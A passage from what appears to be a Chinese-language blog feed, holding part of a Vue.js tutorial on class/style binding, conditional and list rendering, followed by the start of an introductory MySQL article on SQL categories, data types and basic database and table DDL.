class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> vm1=<span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">            el:<span class="string">&quot;#box&quot;</span>,</span></span><br><span class="line">            data:&#123;</span><br><span class="line"><span class="javascript">                myclass1:<span class="literal">false</span>, <span class="comment">// 布尔值变量如果是false，则不会添加对象的属性名作为样式</span></span></span><br><span class="line"><span class="javascript">                myclass2:<span class="literal">true</span>,  <span class="comment">// 布尔值变量如果是true，则会添加对象的属性名作为样式</span></span></span><br><span class="line"><span class="javascript">                myclass3:<span class="literal">false</span>,</span></span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 上面的代码可以:class的值保存到data里面的一个变量，然后使用该变量作为:class的值 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.box4</span>&#123;</span></span><br><span class="line">        background-color: red;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.box5</span>&#123;</span></span><br><span class="line">        color: green;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;mycls.box4=!mycls.box4&quot;</span>&gt;</span>改变背景<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;mycls.box5=!mycls.box5&quot;</span>&gt;</span>改变字体颜色<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">:class</span>=<span class="string">&quot;mycls&quot;</span>&gt;</span>第二个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> vm2 = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">            el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line">            data:&#123;</span><br><span class="line">                mycls:&#123;</span><br><span class="line"><span class="javascript">                    box4:<span class="literal">false</span>,</span></span><br><span class="line"><span class="javascript">                    box5:<span class="literal">true</span></span></span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 批量给元素增加多个class样式类 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.box6</span>&#123;</span></span><br><span class="line">        background-color: red;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.box7</span>&#123;</span></span><br><span class="line">        color: green;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.box8</span>&#123;</span></span><br><span class="line">        border: 1px solid yellow;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app2&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span> <span class="attr">:class</span>=<span class="string">&quot;[mycls1,mycls2]&quot;</span>&gt;</span>第三个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> vm3 = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">            el:<span class="string">&quot;#app2&quot;</span>,</span></span><br><span class="line">            data:&#123;</span><br><span class="line">                mycls1:&#123;</span><br><span class="line"><span class="javascript">                    box6:<span class="literal">true</span>,</span></span><br><span class="line"><span class="javascript">                    box7:<span class="literal">true</span>,</span></span><br><span class="line">                &#125;,</span><br><span class="line">                mycls2:&#123;</span><br><span class="line"><span class="javascript">                    box8:<span class="literal">true</span>,</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>总结：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Copy1. 给元素绑定class类名，最常用的就是第二种。</span><br><span class="line">    vue对象的data数据：</span><br><span class="line">        data:&#123;</span><br><span class="line">          myObj:&#123;</span><br><span class="line">            complete:true,</span><br><span class="line">            uncomplete:false,</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">		html元素：    </span><br><span class="line">    		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;myObj&quot;</span>&gt;</span>2222<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    最终浏览器效果：</span><br><span class="line">		    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box complete&quot;</span>&gt;</span>2222<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="标签style样式"><a href="#标签style样式" class="headerlink" title="标签style样式"></a>标签style样式</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">格式1：值是json对象，对象写在元素的:style属性中</span><br><span class="line">	 标签元素：</span><br><span class="line">		     <span class="tag">&lt;<span class="name">div</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;color: activeColor, fontSize: fontSize + &#x27;px&#x27; &#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	 data数据如下：</span><br><span class="line">         data: &#123;</span><br><span class="line">             activeColor: &#x27;red&#x27;,</span><br><span class="line">             fontSize: 30</span><br><span class="line">         &#125;</span><br><span class="line">格式2：值是对象变量名，对象在data中进行声明</span><br><span class="line">   标签元素：</span><br><span class="line">   			<span class="tag">&lt;<span class="name">div</span> <span class="attr">v-bind:style</span>=<span class="string">&quot;styleObject&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   data数据如下：</span><br><span class="line">         data: &#123;</span><br><span class="line">            	styleObject: &#123;</span><br><span class="line">             		color: &#x27;red&#x27;,</span><br><span class="line">             		fontSize: &#x27;13px&#x27;</span><br><span class="line">			  	&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">格式3：值是数组</span><br><span class="line">  标签元素：</span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">v-bind:style</span>=<span class="string">&quot;[style1, style2]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	data数据如下：</span><br><span class="line">				data: &#123;</span><br><span class="line">                     style1:&#123;</span><br><span class="line">                       color:&quot;red&quot;</span><br><span class="line">                     &#125;,</span><br><span class="line">                     style2:&#123;</span><br><span class="line">                       background:&quot;yellow&quot;,</span><br><span class="line">                       fontSize: &quot;21px&quot;</span><br><span class="line">                     &#125;</span><br><span class="line">				&#125;</span><br></pre></td></tr></table></figure>

<h4 id="vue版本选项卡"><a href="#vue版本选项卡" class="headerlink" title="vue版本选项卡"></a>vue版本选项卡</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-id">#card</span>&#123;</span></span><br><span class="line">            width: 500px;</span><br><span class="line">            height: 350px;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.title</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">height</span><span class="selector-pseudo">:50px</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.title</span> <span class="selector-tag">span</span>&#123;</span></span><br><span class="line">            width: 100px;</span><br><span class="line">            height: 50px;</span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span>:<span class="selector-id">#ccc</span>;</span></span><br><span class="line">            display: inline-block;</span><br><span class="line"><span class="css">            <span class="selector-tag">line-height</span>: 50<span class="selector-tag">px</span>; <span class="comment">/* 设置行和当前元素的高度相等,就可以让文本内容上下居中 */</span></span></span><br><span class="line"><span class="css">            <span class="selector-tag">text-align</span><span class="selector-pseudo">:center</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.content</span> <span class="selector-class">.list</span>&#123;</span></span><br><span class="line">            width: 500px;</span><br><span class="line">            height: 300px;</span><br><span class="line">            background-color: yellow;</span><br><span class="line">            display: none;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.content</span> <span class="selector-class">.active</span>&#123;</span></span><br><span class="line">            display: block;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.title</span> <span class="selector-class">.current</span>&#123;</span></span><br><span class="line">            background-color: yellow;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> @<span class="attr">click</span>=<span class="string">&quot;num=0&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;num==0?&#x27;current&#x27;:&#x27;&#x27;&quot;</span>&gt;</span>国内新闻<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> @<span class="attr">click</span>=<span class="string">&quot;num=1&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;num==1?&#x27;current&#x27;:&#x27;&#x27;&quot;</span>&gt;</span>国际新闻<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> @<span class="attr">click</span>=<span class="string">&quot;num=2&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;num==2?&#x27;current&#x27;:&#x27;&#x27;&quot;</span>&gt;</span>银河新闻<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--&lt;span&gt;&#123;&#123;num&#125;&#125;&lt;/span&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;num==0?&#x27;active&#x27;:&#x27;&#x27;&quot;</span>&gt;</span>国内新闻列表<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;num==1?&#x27;active&#x27;:&#x27;&#x27;&quot;</span>&gt;</span>国际新闻列表<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;num==2?&#x27;active&#x27;:&#x27;&#x27;&quot;</span>&gt;</span>银河新闻列表<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 思路：</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 当用户点击标题栏的按钮[span]时，显示对应索引下标的内容块[.list]</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 代码实现：</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> card = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">            el:<span class="string">&quot;#card&quot;</span>,</span></span><br><span class="line">            data:&#123;</span><br><span class="line">                num:0,</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="条件渲染"><a href="#条件渲染" class="headerlink" title="条件渲染"></a>条件渲染</h3><p>vue中提供了两个指令可以用于判断是否要显示元素，分别是v-if和v-show。</p>
<h4 id="v-if"><a href="#v-if" class="headerlink" title="v-if"></a>v-if</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">标签元素：</span><br><span class="line">    <span class="comment">&lt;!-- vue对象最终会把条件的结果变成布尔值 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-if</span>=<span class="string">&quot;ok&quot;</span>&gt;</span>Yes<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">data数据：</span><br><span class="line">	data:&#123;</span><br><span class="line">    	ok:false    // true则是显示，false是隐藏</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h4 id="v-else"><a href="#v-else" class="headerlink" title="v-else"></a>v-else</h4><p>v-else指令来表示 v-if 的“else 块”，v-else 元素必须紧跟在带 v-if 或者 v-else-if 的元素的后面，否则它将不会被识别。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">标签元素：</span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-if</span>=<span class="string">&quot;ok&quot;</span>&gt;</span>Yes<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-else</span>&gt;</span>No<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">data数据：</span><br><span class="line">		data:&#123;</span><br><span class="line">    		ok:false    // true则是显示，false是隐藏</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="v-else-if"><a href="#v-else-if" class="headerlink" title="v-else-if"></a>v-else-if</h4><p>可以出现多个v-else-if语句，但是v-else-if之前必须有一个v-if开头。后面可以跟着v-else，也可以没有。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">标签元素：</span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-if</span>=<span class="string">&quot;num==1&quot;</span>&gt;</span>num的值为1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-else-if</span>=<span class="string">&quot;num==2&quot;</span>&gt;</span>num的值为2<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-else</span>&gt;</span>num的值是&#123;&#123;num&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">data数据：</span><br><span class="line">		data:&#123;</span><br><span class="line">    		num:2</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="v-show"><a href="#v-show" class="headerlink" title="v-show"></a>v-show</h4><p>用法和v-if大致一样，区别在于2点：</p>
<ol>
<li>v-show后面不能v-else或者v-else-if</li>
<li>v-show隐藏元素时，使用的是display:none来隐藏的，而v-if是直接从HTML文档中移除元素[ DOM操作中的remove ]</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">标签元素：</span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-show</span>=<span class="string">&quot;ok&quot;</span>&gt;</span>Hello!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">data数据：</span><br><span class="line">		data:&#123;</span><br><span class="line">    		ok:false    // true则是显示，false是隐藏</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="列表渲染"><a href="#列表渲染" class="headerlink" title="列表渲染"></a>列表渲染</h3><p>在vue中，可以通过v-for指令可以将一组数据渲染到页面中，数据可以是数组或者对象。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">数据是数组：        </span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--book是列表的每一个元素--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;book in book_list&quot;</span>&gt;</span>&#123;&#123;book.title&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--book是列表的每一个元素，index是每个元素的下标--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;book, index in book_list&quot;</span>&gt;</span>第&#123;&#123; index+1&#125;&#125;本图书：&#123;&#123;book.title&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> vm1 = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">                el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line">                data:&#123;</span><br><span class="line">                    book_list:[</span><br><span class="line"><span class="javascript">                        &#123;<span class="string">&quot;id&quot;</span>:<span class="number">1</span>,<span class="string">&quot;title&quot;</span>:<span class="string">&quot;图书名称1&quot;</span>,<span class="string">&quot;price&quot;</span>:<span class="number">200</span>&#125;,</span></span><br><span class="line"><span class="javascript">                        &#123;<span class="string">&quot;id&quot;</span>:<span class="number">2</span>,<span class="string">&quot;title&quot;</span>:<span class="string">&quot;图书名称2&quot;</span>,<span class="string">&quot;price&quot;</span>:<span class="number">200</span>&#125;,</span></span><br><span class="line"><span class="javascript">                        &#123;<span class="string">&quot;id&quot;</span>:<span class="number">3</span>,<span class="string">&quot;title&quot;</span>:<span class="string">&quot;图书名称3&quot;</span>,<span class="string">&quot;price&quot;</span>:<span class="number">200</span>&#125;,</span></span><br><span class="line"><span class="javascript">                        &#123;<span class="string">&quot;id&quot;</span>:<span class="number">4</span>,<span class="string">&quot;title&quot;</span>:<span class="string">&quot;图书名称4&quot;</span>,<span class="string">&quot;price&quot;</span>:<span class="number">200</span>&#125;,</span></span><br><span class="line">                    ]</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">数据是对象：</span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--i是每一个value值--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;value in book&quot;</span>&gt;</span>&#123;&#123;value&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--i是每一个value值,j是每一个键名--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;attr, value in book&quot;</span>&gt;</span>&#123;&#123;attr&#125;&#125;:&#123;&#123;value&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> vm1 = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">                el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line">                data:&#123;</span><br><span class="line">                    book: &#123;</span><br><span class="line"><span class="javascript">                        <span class="comment">// &quot;attr&quot;:&quot;value&quot;</span></span></span><br><span class="line"><span class="javascript">                        <span class="string">&quot;id&quot;</span>:<span class="number">11</span>,</span></span><br><span class="line"><span class="javascript">                        <span class="string">&quot;title&quot;</span>:<span class="string">&quot;图书名称1&quot;</span>,</span></span><br><span class="line"><span class="javascript">                        <span class="string">&quot;price&quot;</span>:<span class="number">200</span></span></span><br><span class="line">                    &#125;,</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;)</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>





<p>参考链接：</p>
<p><a href="https://www.cnblogs.com/saoqiang/p/12495181.html">https://www.cnblogs.com/saoqiang/p/12495181.html</a></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL基础</title>
    <url>/2020/11/11/MySQL%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="常见数据库"><a href="#常见数据库" class="headerlink" title="常见数据库"></a>常见数据库</h1><blockquote>
<p>一个数据库服务器包含多个库，一个数据库包含多个表，一个表包含多条记录，一条记录包含多个字段</p>
</blockquote>
<ul>
<li><p><strong>数据库</strong>：存储和管理数据的仓库，按照有关规则组织起来，可以被各种用户或应用共享的数据集合。数据库通常可以划分为关系型数据库和非关系型数据库</p>
<ul>
<li>关系型数据库：MySQL、Oracle</li>
<li>非关系型数据库:  redis、mecache</li>
</ul>
</li>
<li><p><strong>数据库管理系统DBMS</strong>：用户通过数据库管理系统DBMS访问数据库中的数据</p>
</li>
</ul>
<p>​    <strong>特点</strong>：持久化存储数据，本质上是一个文件系统，关系型数据库通过的SQL语句进行管理DBMS</p>
<a id="more"></a>

<h1 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a>SQL语句</h1><blockquote>
<p>Structure Query Language，结构化查询语言，<strong>操作所有关系型数据</strong></p>
<p><strong>查询关键字顺序</strong>：select  from  where    group by   having  order by   limit</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">//Mysql默认是美国的时区，所以要进行设置</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&quot;%time_zone%&quot;</span>;查看时区</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> <span class="keyword">time_zone</span> = <span class="string">&#x27;+8:00&#x27;</span>; 修改时区</span><br><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;立即生效</span><br></pre></td></tr></table></figure>

<h2 id="SQL概述"><a href="#SQL概述" class="headerlink" title="SQL概述"></a>SQL概述</h2><h3 id="SQL语句分类"><a href="#SQL语句分类" class="headerlink" title="SQL语句分类"></a>SQL语句分类</h3><blockquote>
<p>sql语句有四种类型</p>
</blockquote>
<ol>
<li><p>DDL (definition)：数据定义语言    <strong>create,drop,alter</strong></p>
</li>
<li><p>DML（manipulation)：数据操作语言 <strong>insert delete update</strong></p>
</li>
<li><p>DQL (query):   数据查询语言     <strong>select where</strong></p>
</li>
<li><p>DCL (control):   数据控制语言  定义数据库的访问权限和安全级别以及创建用户  <strong>grant revoke</strong></p>
</li>
</ol>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><ul>
<li><p>基本类型：int整型、double(4,1)浮点型   </p>
</li>
<li><p>时间类型：time、date ( 年月日) 、datetime（年月日时分秒、timestamp:时间戳类型  <code>yyyy-MM-dd HH:mm:ss </code> 记录某个业务日期</p>
</li>
<li><p>字符串型：varchar(可变长度字符串 name varchar(20) ==姓名最大20个字符)、char不可变字符串</p>
</li>
<li><p>二进制类型：blob( binary large object) 大二进制</p>
</li>
</ul>
<h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><blockquote>
<p>不存在时创建数据库并指定字符集</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exists</span> 数据库名 <span class="built_in">character</span> <span class="keyword">set</span> gbk;</span><br></pre></td></tr></table></figure>

<h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><ol>
<li>查看数据库：<strong>show</strong> database<strong>s</strong>;</li>
<li>查询数据库的创建信息：show create database db1;</li>
<li>当前正在操作的数据库 ：<strong>select</strong> database();</li>
<li>使用命令切换当前正在使用的数据库：<strong>use</strong> <code>数据库名</code>；</li>
</ol>
<h3 id="修改删除"><a href="#修改删除" class="headerlink" title="修改删除"></a>修改删除</h3><ol>
<li>修改数据库：<strong>alter</strong> database <code>数据库名</code>  character <strong>set</strong> GBK；</li>
<li>删除数据库：<strong>drop</strong> database if exists <code>数据库名</code>；</li>
</ol>
<h2 id="表操作"><a href="#表操作" class="headerlink" title="表操作"></a>表操作</h2><h3 id="DDL"><a href="#DDL" class="headerlink" title="DDL"></a>DDL</h3><h4 id="创建create"><a href="#创建create" class="headerlink" title="创建create"></a>创建create</h4><ol>
<li>创建一个表：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名（</span><br><span class="line">	列名 <span class="number">1</span> 数据类型<span class="number">1</span>，</span><br><span class="line">	列名<span class="number">2</span>  数据类型<span class="number">2</span>	,	//最后一列不加逗号</span><br><span class="line">	score <span class="keyword">DOUBLE</span>(<span class="number">4</span>,<span class="number">1</span>),</span><br><span class="line">	sname <span class="built_in">VARCHAR</span>(<span class="number">50</span>)</span><br><span class="line">）;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>创建一个相似的表：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名<span class="number">2</span> <span class="keyword">like</span> 表名;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h4 id="查看show"><a href="#查看show" class="headerlink" title="查看show"></a>查看show</h4><ol>
<li><p>查看表结构：<strong>desc</strong> 表名</p>
</li>
<li><p>查看当前数据库的所有表： show tables;</p>
</li>
</ol>
<h4 id="修改alter"><a href="#修改alter" class="headerlink" title="修改alter"></a>修改alter</h4><ol>
<li><p>修改表名： <strong>alter</strong> table 表名 <strong><em>rename</em> <em>to</em></strong> 新表名</p>
</li>
<li><p>增加新的列：alter table 表名 <strong>add</strong>  remark varchar(30);</p>
</li>
<li><p>修改列：alter table 表名 <strong>change</strong> remark  intro varchar(20);</p>
</li>
<li><p>修改列：alter table 表名 <strong>modify</strong>  intro varchar(130);</p>
</li>
</ol>
<h4 id="删除drop"><a href="#删除drop" class="headerlink" title="删除drop"></a>删除drop</h4><ol>
<li><p>删除一列：<strong>alter</strong> table student4 <strong>drop</strong> intro</p>
</li>
<li><p>删除表：<strong>drop</strong> table if exists student4;</p>
</li>
</ol>
